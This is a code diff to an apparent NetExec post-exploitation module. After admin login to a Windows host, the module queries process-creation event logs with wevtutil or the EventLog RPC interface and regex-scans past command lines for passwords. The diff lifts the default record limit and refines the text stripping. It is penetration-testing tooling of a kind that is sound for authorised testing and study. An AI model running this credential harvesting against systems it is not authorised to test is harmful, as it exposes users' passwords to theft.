@@ -20,13 +20,13 @@ class NXCModule:
         self.context = None
         self.module_options = None
         self.method = "execute"
-        self.limit = 1000
+        self.limit = None
 
     def options(self, context, module_options):
         """ 
-        METHOD         EventLog method (Execute or RPCCALL)
+        METHOD         EventLog method (Execute or RPCCALL), default: execute
         M              Alias for METHOD
-        LIMIT          Limit of the number of records to be fetched
+        LIMIT          Limit of the number of records to be fetched, default: unlimited
         L              Alias for LIMIT
         """
         if "METHOD" in module_options:
@@ -41,8 +41,6 @@ class NXCModule:
     def find_credentials(self, content, context):
         # remove unnecessary words
         content = content.replace("\r\n", "\n")
-        content = content.replace("/add", "")
-        content = content.replace("/active:yes", "")
 
         # sort and unique lines
         content = "\n".join(sorted(set(content.split("\n"))))
@@ -66,9 +64,16 @@ class NXCModule:
         # Extracting credentials
         for line in content.split("\n"):
             for reg in regexps:
-                # verbose context.log.debug("Line: " + line)
-                # verbose context.log.debug("Reg: " + reg)
-                match = re.search(reg, line, re.IGNORECASE)
+                # Remove unnecessary words
+                line_stripped = line.replace("/add", "") \
+                    .replace("/active:yes", "") \
+                    .replace("/delete", "") \
+                    .replace("/domain", "") \
+                # Remove command lines that were executed with nxc
+                line_stripped = re.sub(r"1> \\Windows\\Temp\\[\w]{6} 2>&1", "", line_stripped)
+
+                # Use regex to find credentials
+                match = re.search(reg, line_stripped, re.IGNORECASE)
                 if match:
                     # eleminate false positives
                     # C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay
@@ -92,11 +97,12 @@ class NXCModule:
 
     def on_admin_login(self, context, connection):
         content = ""
-        if self.method[:1].lower() == "e":
+        if self.method.lower().startswith("e"):
+            limit_str = f"/c:{self.limit}" if self.limit is not None else ""
             # https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688
             commands = [
-                f'wevtutil qe Security /c:{self.limit} /f:text /rd:true /q:"*[System[(EventID=4688)]]" |findstr "Command Line"',
-                f'wevtutil qe Microsoft-Windows-Sysmon/Operational /c:{self.limit} /f:text  /rd:true /q:"*[System[(EventID=1)]]" |findstr "ParentCommandLine"'
+                f'wevtutil qe Microsoft-Windows-Sysmon/Operational {limit_str} /f:text  /rd:true /q:"*[System[(EventID=1)]]" | findstr "ParentCommandLine"',
+                f'wevtutil qe Security {limit_str} /f:text /rd:true /q:"*[System[(EventID=4688)]]" | findstr "Command Line"',
             ]
             for command in commands:
                 context.log.debug("Execute Command: " + command)
@@ -127,7 +133,6 @@ class NXCModule:
                         content += "CommandLine: " + match.group("CommandLine") + "\n"
                 except Exception as e:
                     context.log.error(f"Error: {e}")
-                    continue
 
         self.find_credentials(content, context)
 
@@ -182,7 +187,7 @@ class MSEven6Trigger:
 
 
 class MSEven6Result:
-    def __init__(self, conn, handle, limit):
+    def __init__(self, conn, handle, limit=None):
         self._conn = conn
         self._handle = handle
         self._hardlimit = limit
@@ -192,11 +197,12 @@ class MSEven6Result:
         return self
 
     def __next__(self):
-        self._hardlimit -= 1
-        if self._hardlimit < 0:
-            raise StopIteration
+        if self._hardlimit is not None:
+            self._hardlimit -= 1
+            if self._hardlimit < 0:
+                raise StopIteration
         if self._resp is not None and self._resp["NumActualRecords"] == 0:
-            return None
+            raise StopIteration
 
         if self._resp is None or self._index == self._resp["NumActualRecords"]:
             req = even6.EvtRpcQueryNext()
